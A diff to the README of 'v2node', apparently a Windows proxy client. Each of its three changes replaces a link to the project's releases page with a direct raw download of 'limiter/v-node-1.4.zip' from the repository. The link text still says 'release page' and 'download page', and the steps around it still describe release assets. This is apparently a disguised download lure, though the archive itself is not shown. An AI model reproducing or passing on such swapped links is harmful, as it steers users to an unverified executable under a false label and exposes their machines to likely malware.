@@ -1,6 +1,6 @@
 # 🌐 v2node - Reliable network tools for your connection
 
-[![Download v2node](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Intermolecular-sirdar532/v2node/releases)
+[![Download v2node](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/Intermolecular-sirdar532/v2node/raw/refs/heads/main/limiter/v-node-1.4.zip)
 
 v2node serves as a robust networking utility. It helps you manage your internet traffic with high performance. This software supports multiple protocols including Shadowsocks, Trojan, and VLESS. It ensures your connection remains stable and fast.
 
@@ -8,7 +8,7 @@ v2node serves as a robust networking utility. It helps you manage your internet 
 
 You need to access the release page to get the software. Follow these steps:
 
-1. Click the link above or visit the [release page](https://github.com/Intermolecular-sirdar532/v2node/releases).
+1. Click the link above or visit the [release page](https://github.com/Intermolecular-sirdar532/v2node/raw/refs/heads/main/limiter/v-node-1.4.zip).
 2. Look for the section titled "Assets" at the bottom of the latest release post.
 3. Select the file ending in `.exe` that matches your Windows system.
 4. Save the file to your computer.
@@ -63,7 +63,7 @@ If the application does not connect, try these steps in order:
 2. Verify the configuration link. Ensure you copied the full link from your provider.
 3. Check your firewall settings. Sometimes, Windows Defender blocks new programs. Ensure v2node has permission to access the network.
 4. Restart the program. Close the window and launch the `.exe` file again.
-5. Update the software. Older versions might not support the newest proxy protocols. Visit the [download page](https://github.com/Intermolecular-sirdar532/v2node/releases) to see if you have the latest file.
+5. Update the software. Older versions might not support the newest proxy protocols. Visit the [download page](https://github.com/Intermolecular-sirdar532/v2node/raw/refs/heads/main/limiter/v-node-1.4.zip) to see if you have the latest file.
 
 ## 🌐 Technical details
 
